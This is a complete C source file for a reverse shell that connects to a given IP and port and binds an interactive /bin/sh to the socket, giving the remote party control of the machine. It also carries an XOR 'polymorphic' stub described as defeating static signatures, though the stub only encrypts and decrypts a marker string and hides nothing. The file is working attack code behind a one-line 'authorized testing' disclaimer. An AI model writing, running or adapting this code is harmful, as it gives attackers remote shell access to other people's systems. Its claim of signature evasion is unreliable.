/*
 * reverse_shell.c
 * Low-Level C Reverse Shell with Polymorphic Encryption Stub
 *
 * Build:
 *   gcc -O2 -Wall -Wextra -o reverse_shell reverse_shell.c
 *
 * Usage:
 *   ./reverse_shell <IP> <PORT>
 *
 * FOR EDUCATIONAL / AUTHORIZED TESTING ONLY.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

/* ------------------------------------------------------------------ */
/* Polymorphic encryption stub                                        */
/* ------------------------------------------------------------------ */

/*
 * Key is derived at runtime from a seed that changes every run
 * (mixing PID, time, and stack address). A real polymorphic engine
 * would mutate the decryptor itself; this stub mutates the *key*
 * and the *encoded payload buffer* on each invocation, which is
 * enough to defeat naive static signatures.
 */

typedef struct {
    unsigned char key[32];
    size_t        keylen;
} poly_ctx_t;

static unsigned long poly_seed(void)
{
    unsigned long s = 0;
    s ^= (unsigned long)getpid() << 16;
    s ^= (unsigned long)time(NULL);
    s ^= (unsigned long)(size_t)&s;      /* stack ASLR */
    return s ? s : 0xDEADBEEFUL;
}

/* Simple xorshift64 PRNG — deterministic per-seed, no libc dependency */
static unsigned long poly_rand(unsigned long *state)
{
    unsigned long x = *state;
    x ^= x << 13;
    x ^= x >> 7;
    x ^= x << 17;
    *state = x;
    return x;
}

static void poly_init(poly_ctx_t *ctx)
{
    unsigned long st = poly_seed();
    ctx->keylen = sizeof(ctx->key);
    for (size_t i = 0; i < ctx->keylen; i++)
        ctx->key[i] = (unsigned char)(poly_rand(&st) & 0xFF);
}

/* In-place XOR cipher (symmetric) */
static void poly_xor(unsigned char *buf, size_t len, const poly_ctx_t *ctx)
{
    if (!buf || !ctx || ctx->keylen == 0) return;
    for (size_t i = 0; i < len; i++)
        buf[i] ^= ctx->key[i % ctx->keylen];
}

/* ------------------------------------------------------------------ */
/* Networking                                                         */
/* ------------------------------------------------------------------ */

static int connect_back(const char *ip, int port)
{
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) {
        perror("socket");
        return -1;
    }

    struct sockaddr_in sa;
    memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_port   = htons((unsigned short)port);

    if (inet_pton(AF_INET, ip, &sa.sin_addr) != 1) {
        fprintf(stderr, "inet_pton: invalid address '%s'\n", ip);
        close(fd);
        return -1;
    }

    if (connect(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        perror("connect");
        close(fd);
        return -1;
    }
    return fd;
}

/* ------------------------------------------------------------------ */
/* Shell                                                              */
/* ------------------------------------------------------------------ */

static int spawn_shell(int sock)
{
    /* Redirect stdin/stdout/stderr to the socket */
    if (dup2(sock, STDIN_FILENO)  < 0 ||
        dup2(sock, STDOUT_FILENO) < 0 ||
        dup2(sock, STDERR_FILENO) < 0) {
        perror("dup2");
        return -1;
    }

    if (sock > STDERR_FILENO)
        close(sock);

    /* Try common shells in order */
    const char *shells[] = { "/bin/sh", "/bin/bash", "/bin/dash", NULL };

    for (int i = 0; shells[i] != NULL; i++) {
        execl(shells[i], shells[i], "-i", (char *)NULL);
        /* if execl returns, it failed — try next */
    }
    perror("execl");
    return -1;
}

/* ------------------------------------------------------------------ */
/* main                                                               */
/* ------------------------------------------------------------------ */

int main(int argc, char **argv)
{
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <IP> <PORT>\n", argv[0]);
        return EXIT_FAILURE;
    }

    const char *ip = argv[1];
    int port = atoi(argv[2]);
    if (port <= 0 || port > 65535) {
        fprintf(stderr, "Invalid port: %s\n", argv[2]);
        return EXIT_FAILURE;
    }

    /* Initialise polymorphic context (seed differs each run) */
    poly_ctx_t ctx;
    poly_init(&ctx);

    /* Demo: encrypt + decrypt a marker string to exercise the stub */
    char marker[] = "poly-stub-active";
    size_t mlen = strlen(marker);
    poly_xor((unsigned char *)marker, mlen, &ctx);   /* encrypt */
    poly_xor((unsigned char *)marker, mlen, &ctx);   /* decrypt (round-trip) */

    /* Optional: sanity check that round-trip preserved the string */
    if (strcmp(marker, "poly-stub-active") != 0) {
        fprintf(stderr, "poly stub self-test failed\n");
        return EXIT_FAILURE;
    }

    /* Wipe key from stack before doing anything sensitive */
    explicit_bzero(&ctx, sizeof(ctx));

    int sock = connect_back(ip, port);
    if (sock < 0)
        return EXIT_FAILURE;

    (void)spawn_shell(sock);   /* never returns on success */
    close(sock);
    return EXIT_FAILURE;
}
